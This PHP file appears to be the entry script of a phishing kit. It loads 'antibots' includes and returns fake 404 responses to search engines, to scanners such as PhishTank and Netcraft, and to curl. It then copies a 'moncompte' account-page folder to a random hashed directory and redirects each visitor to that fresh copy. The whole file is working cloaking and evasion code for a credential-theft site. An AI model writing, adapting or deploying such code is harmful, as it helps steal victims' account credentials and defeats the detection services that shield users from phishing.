<?php





session_start();

error_reporting(0);

	$random = rand(0,100000).$_SERVER['REMOTE_ADDR'];

	$session    = substr(md5($random), 0, 14);

//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//

include "./BOTS/antibots1.php";

include "./BOTS/antibots2.php";

include "./BOTS/antibots3.php";

include "./BOTS/antibots4.php";

include "./BOTS/antibots5.php";

include "./BOTS/antibots6.php";

//----------------------------------------------------------------------------------------------------------------//

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

//----------------------------------------------------------------------------------------------------------------//

function is_bitch($user_agent){

    $bitchs = array(

        'Googlebot', 

        'Baiduspider', 

        'ia_archiver',

        'R6_FeedFetcher', 

        'NetcraftSurveyAgent', 

        'Sogou web spider',

        'bingbot', 

        'Yahoo! Slurp', 

        'facebookexternalhit', 

        'PrintfulBot',

        'msnbot', 

        'Twitterbot', 

        'UnwindFetchor', 

        'urlresolver', 

        'Butterfly', 

        'TweetmemeBot',

        'PaperLiBot',

        'MJ12bot',

        'AhrefsBot',

        'Exabot',

        'Ezooms',

        'YandexBot',

        'SearchmetricsBot',

		'phishtank',

		'PhishTank',

        'picsearch',

        'TweetedTimes Bot',

        'QuerySeekerSpider',

        'ShowyouBot',

        'woriobot',

        'merlinkbot',

        'BazQuxBot',

        'Kraken',

        'SISTRIX Crawler',

        'R6_CommentReader',

        'magpie-crawler',

        'GrapeshotCrawler',

        'PercolateCrawler',

        'MaxPointCrawler',

        'R6_FeedFetcher',

        'NetSeer crawler',

        'grokkit-crawler',

        'SMXCrawler',

        'PulseCrawler',

        'Y!J-BRW',

        '80legs.com/webcrawler',

        'Mediapartners-Google', 

        'Spinn3r', 

        'InAGist', 

        'Python-urllib', 

        'NING', 

        'TencentTraveler',

        'Feedfetcher-Google', 

        'mon.itor.us', 

        'spbot', 

        'Feedly',

        'bot',

        'curl',

        "spider",

        "crawler");

    	foreach($bitchs as $bitch){

            if( stripos( $user_agent, $bitch ) !== false ) return true;

        }

    	return false;

}

if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {

    echo "404 NOT FOUND";

    exit;

}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

// 

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$dst=md5("$base");
function recurse_copy($src,$dst) {
$dir = opendir($src);
@mkdir($dst);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($src . '/' . $file) ) {
recurse_copy($src . '/' . $file,$dst . '/' . $file);
}
else {
copy($src . '/' . $file,$dst . '/' . $file);
}
}
}
closedir($dir);
}
$src="moncompte";
recurse_copy( $src, $dst );
header("location:$dst");



?>

